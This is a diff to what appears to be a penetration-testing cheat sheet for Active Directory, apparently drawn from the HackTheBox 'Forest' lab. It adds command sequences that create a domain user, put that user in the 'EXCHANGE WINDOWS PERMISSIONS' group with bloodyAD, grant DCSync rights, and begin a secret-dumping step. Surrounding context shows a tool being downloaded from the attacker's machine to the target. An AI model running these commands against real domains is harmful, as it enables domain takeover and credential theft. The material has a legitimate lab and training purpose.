@@ -550,6 +550,14 @@ python3 -m http.server 80 # kali machine
 curl http://$your_ip/PowerView.ps1 -O PowerView.ps1 # target machine
 ```
 
+Anouther way 
+
+Create a new user
+
+```bash
+net user john password! /add /domain
+```
+
 Anouther way more shortly
 
 ```bash
@@ -569,6 +577,34 @@ $cred = ConvertTo-SecureString 'some_pass' -AsPlainText -Force
 # 
 set-domainuserpassword $target_user -accountpassword $cred
 ```
+
+Anouther way 
+
+1.Create a new user
+
+```bash
+net user john password! /add /domain
+```
+or
+
+```bash
+bloodyAD -u 'svc-alfresco' -p 's3rvice' --host forest.htb.local -d htb.local add user 'john2' 'password'
+```
+
+2.Add user to group which have a WriteDACL over domain
+
+```bash
+bloodyAD -u 'svc-alfresco' -p 's3rvice' --host forest.htb.local -d htb.local add groupMember  'EXCHANGE WINDOWS PERMISSIONS' 'john2' 
+```
+
+3.Add DCSync to user
+
+```bash
+bloodyAD -u 'john2' -p 'password' --host forest.htb.local -d htb.local add dcsync john2
+```
+
+4.Dump secrets with DCSync 
+
 
 [[write]]
 == Write Owner
